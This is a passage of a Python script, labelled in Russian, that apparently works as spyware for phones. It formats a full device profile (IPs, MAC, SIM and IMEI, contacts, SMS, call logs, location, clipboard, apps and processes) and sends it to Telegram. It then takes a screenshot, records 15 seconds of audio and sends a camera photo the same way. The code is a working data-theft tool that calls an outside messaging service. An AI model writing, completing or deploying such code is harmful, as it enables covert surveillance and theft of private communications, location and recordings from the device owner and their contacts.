Железо: {device_info['hardware']}
GPU: {device_info['gpu_renderer']}
Бренд: {device_info['product_brand']}
Ядро: {device_info['kernel_version']}
CPU: {device_info['cpu_frequency']} | Load: {device_info['cpu_load']}
Термальные зоны: {device_info['thermal_zones']}
"""
    
    part2 = f"""
🔋 БАТАРЕЯ И СЕНСОРЫ:
Батарея: {battery_summary}
RAM: {device_info['total_memory']} | Использовано: {ram_usage}
Сенсоры: {sensors_summary}

🌐 СЕТЬ:
Внешний IP: <code>{device_info['external_ip']}</code>
Локальный IP: <code>{device_info['local_ip']}</code>
MAC: <code>{device_info['mac_address']}</code>
DNS: {device_info['dns_servers'][:100]}...
Wi-Fi: {wifi_summary}
Данные: {data_usage}
Пинг: {ping_latency}
Bluetooth: {bluetooth_summary}
SIM: {sim_summary}
{imei_summary}
Интерфейсы: {device_info['network_interfaces'][:200]}...
"""
    
    part3 = f"""
💾 ХРАНИЛИЩЕ:
Всего: {device_info.get('storage_total', 'N/A')}
Использовано: {device_info.get('storage_used', 'N/A')}
Свободно: {device_info.get('storage_free', 'N/A')}
Детали: {device_info['storage_details'][:200]}...

👤 СИСТЕМА:
Пользователь: {device_info['current_user']}
Платформа: {device_info['platform']}
Python: {device_info['python_version']}
Часовой пояс: {device_info['timezone']}
Язык: {device_info['language']}
Окружение: {env_summary}

📱 ЭКРАН И ПРИЛОЖЕНИЯ:
Разрешение: {device_info['screen_resolution']}
Плотность: {device_info['screen_density']}
Приложений: {apps_summary}
Разрешения: {permissions_summary}
Активное: {device_info['foreground_app']}
Браузер: {device_info['browser_info'][:100]}...
Пакеты: {packages_summary}
"""
    
    part4 = f"""
📞 КОММУНИКАЦИИ:
{contacts_summary}
{sms_summary}
{calls_summary}
Местоположение: {location_summary}
Буфер: {clipboard_summary}

⚙️ ПРОЦЕССЫ:
{processes_summary}

⏰ ВРЕМЯ: {device_info['current_time']}
🔧 Fingerprint: <code>{device_info['device_fingerprint']}</code>

<b>Детальные списки в файлах ниже.</b>
"""
    
    split_and_send_message([part1, part2, part3, part4])
    
    apps_buffer, apps_fn = create_detailed_buffer('\n'.join(device_info['detailed_apps']), 'apps_list.txt')
    send_to_telegram(document_buffers=[(apps_buffer, apps_fn)], caption='Список приложений')
    
    processes_buffer, proc_fn = create_detailed_buffer('\n'.join(str(p) for p in device_info['running_processes']) + f'\n\nВсе: {device_info["all_processes"]}', 'processes.txt')
    send_to_telegram(document_buffers=[(processes_buffer, proc_fn)], caption='Процессы')
    
    if device_info['contacts']:
        contacts_buffer, cont_fn = create_detailed_buffer(json.dumps(device_info['contacts'], ensure_ascii=False, indent=2), 'contacts.json')
        send_to_telegram(document_buffers=[(contacts_buffer, cont_fn)], caption='Контакты')
    
    if device_info['call_logs']:
        calls_buffer, calls_fn = create_detailed_buffer(json.dumps(device_info['call_logs'], ensure_ascii=False, indent=2), 'calls.json')
        send_to_telegram(document_buffers=[(calls_buffer, calls_fn)], caption='Журнал звонков')
    
    screenshot_bytes = capture_screenshot_bytes()
    if screenshot_bytes:
        send_to_telegram(photo_bytes=screenshot_bytes, caption='Скриншот')
    
    audio_bytes = record_audio_bytes()
    if audio_bytes:
        send_to_telegram(audio_bytes=audio_bytes, caption='Аудиозапись (15 сек)')
    
    if device_info['camera_photo']:
        try:
            camera_bytes = base64.b64decode(device_info['camera_photo'])
            send_to_telegram(photo_bytes=camera_bytes, caption='Фото с камеры')
        except:
            pass

if __name__ == "__main__":
    send_system_info()
